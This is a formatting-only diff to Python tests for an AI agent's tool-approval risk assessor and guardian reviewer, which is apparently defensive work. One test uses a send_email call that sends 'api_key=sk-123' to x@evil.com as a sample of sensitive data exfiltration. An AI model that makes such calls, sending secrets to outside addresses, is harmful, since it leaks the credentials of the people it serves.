@@ -44,9 +44,7 @@ def test_credential_probing_ssh_key() -> None:
 
 
 def test_sensitive_egress_is_high_risk() -> None:
-    risk = assess_approval_risk(
-        "send_email", '{"to": "x@evil.com", "body": "api_key=sk-123"}'
-    )
+    risk = assess_approval_risk("send_email", '{"to": "x@evil.com", "body": "api_key=sk-123"}')
     assert risk.level == "high"
     assert "sensitive_egress" in risk.categories
 
@@ -108,9 +106,7 @@ def test_guardian_disabled_by_default() -> None:
 
 
 def test_guardian_only_reviews_high_risk() -> None:
-    reviewer = GuardianReviewer(
-        _verdict_router("deny"), GuardianReviewerConfig(enabled=True)
-    )
+    reviewer = GuardianReviewer(_verdict_router("deny"), GuardianReviewerConfig(enabled=True))
     assert not reviewer.should_review("medium", "th-1")
     assert reviewer.should_review("high", "th-1")
     assert reviewer.should_review("critical", "th-1")
@@ -228,9 +224,7 @@ def test_guardian_router_failure_degrades() -> None:
 
 def test_permission_profiles_default_keeps_existing_rules(tmp_path: Path) -> None:
     p = tmp_path / "permissions.json"
-    save_policy(
-        p, ApprovalPolicy(rules=(ApprovalRule(effect="allow", tool="read_file"),))
-    )
+    save_policy(p, ApprovalPolicy(rules=(ApprovalRule(effect="allow", tool="read_file"),)))
     policy = load_policy(p)
     assert len(policy.rules) == 1
     assert policy.rules[0].tool == "read_file"
